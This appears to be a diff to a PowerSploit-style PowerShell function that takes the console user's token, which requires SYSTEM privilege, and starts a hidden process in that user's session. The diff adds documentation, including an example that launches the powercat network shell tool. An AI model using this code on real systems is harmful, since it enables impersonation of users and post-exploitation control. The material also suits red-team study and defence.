@@ -1,11 +1,52 @@
 function Run-AsConsoleUser {
+    <#
+.SYNOPSIS
+
+Executes a program as the user currently logged on to the console session.
+Requires the SeTcbPrivilege right. Generally, this means the SYSTEM account.
+
+PowerSploit Function: Run-AsConsoleUser
+Authors: John Laska
+License: BSD 3-Clause
+Required Dependencies: None
+Optional Dependencies: Run-AsConsoleUser.ps1
+    
+.DESCRIPTION
+
+A function which executes a program as the user currently logged on to the console session.
+
+.PARAMETER ApplicationPath
+
+Specifies the path to the executable to be run.
+    
+.PARAMETER CommandLine
+    
+The full command line (with parameters) to be executed.
+
+.PARAMETER WorkingDirectory
+
+Working directory for the process execution.
+
+.EXAMPLE 
+
+PS C:\> Run-AsConsoleUser `
+    -ApplicationPath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
+    -CommandLine "powershell.exe -command '. C:\Temp\powercat.ps1; powercat -"
+
+.LINK
+
+http://obscuresecurity.blogspot.com/2013/01/Get-TimedScreenshot.html
+https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Get-TimedScreenshot.ps1
+#>
+
+    [CmdletBinding()]
     Param (
         [Parameter(position=0, mandatory=$false)]
-        $ApplicationPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        $ApplicationPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
         [Parameter(position=1, mandatory=$false)]
-        $CommandLine = "powershell.exe",
+        $CommandLine = 'powershell.exe',
         [Parameter(position=2, mandatory=$false)]
-        $WorkingDirectory = "C:\"
+        $WorkingDirectory = 'C:\'
     )
 #region define P/Invoke types dynamically
     # Reflection ModelBuilider
@@ -278,7 +319,7 @@ function Run-AsConsoleUser {
     if($ConsoleSessionId -ne 0)
     {
         if($WtsApi32::WTSQueryUserToken($ConsoleSessionId, [ref]$UserToken)) {
-            Write-Output "Got token handle: $UserToken starting PowerShell"
+            #Write-Output "Got token handle: $UserToken starting PowerShell"
         } else {
             Write-Output "Unable to get console user token.  Do you have SeTcbPrivilege?"
         }
@@ -287,8 +328,8 @@ function Run-AsConsoleUser {
 
 #region launch powershell as user 
     $Desktop = "WinSta0\\Default"
-    $ProcessInf = [System.Activator]::CreateInstance($PROCESSINFO) | Out-Null
-    $StartupInf = [System.Activator]::CreateInstance($STARTUPINFO) | Out-Null
+    $ProcessInf = [System.Activator]::CreateInstance($PROCESSINFO)
+    $StartupInf = [System.Activator]::CreateInstance($STARTUPINFO)
     $NORMAL_PRIORITY_CLASS = 0x20
     $CREATE_UNICODE_ENVIRONMENT = 0x400
     $CREATE_NO_WINDOW = 0x08000000
@@ -303,9 +344,10 @@ function Run-AsConsoleUser {
         $StartupInf, [ref]$ProcessInf
     ) | Out-Null
 
-    $UserEnv::DestroyEnvironmentBlock($EnvBlock)
-    $Kernel32::CloseHandle($ProcessInf.hThread)
-    $Kernel32::CloseHandle($ProcessInf.hProcess)
+    $UserEnv::DestroyEnvironmentBlock($EnvBlock) | Out-Null
+    $Kernel32::CloseHandle($ProcessInf.hThread) | Out-Null
+    $Kernel32::CloseHandle($ProcessInf.hProcess) | Out-Null
+    $Kernel32::CloseHandle($UserToken) | Out-Null
 
     Write-Output "Executed:`n$CommandLine`nas PID: $($ProcessInf.dwProcessId)"
 #endregion
